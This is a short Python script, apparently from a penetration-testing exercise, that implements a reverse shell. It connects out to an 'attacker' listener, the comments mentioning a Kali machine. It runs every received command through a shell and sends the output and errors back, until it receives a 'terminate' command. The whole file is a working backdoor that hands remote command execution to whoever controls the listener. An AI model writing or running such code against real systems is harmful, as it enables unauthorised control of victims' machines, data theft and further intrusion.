import socket
import subprocess

def connect():
    Mysocket = socket.socket()

    # define attacker IP and listening port
    Mysocket.connect(('0.0.0.0', 8080))

    while True:
        # keep receiving commands from the Kali machine. read the first KB of the tcp socket
        command = Mysocket.recv(1024)

        # if we got terminate order from the attacker, close the socket and break the loop
        if "terminate" in command.decode():
            Mysocket.close()
            break

        # otherwise, we pass the received command to a shell process
        else:
            CMD = subprocess.Popen(command.decode(),
                                   shell  =  True,
                                   stdin  =  subprocess.PIPE,
                                   stdout =  subprocess.PIPE,
                                   stderr = subprocess.PIPE)
            # send back the result
            Mysocket.send(CMD.stdout.read())

            # send back the error -if any-, such as syntax error
            Mysocket.send(CMD.stderr.read())

def main():
    connect()

if __name__ == '__main__':
    main()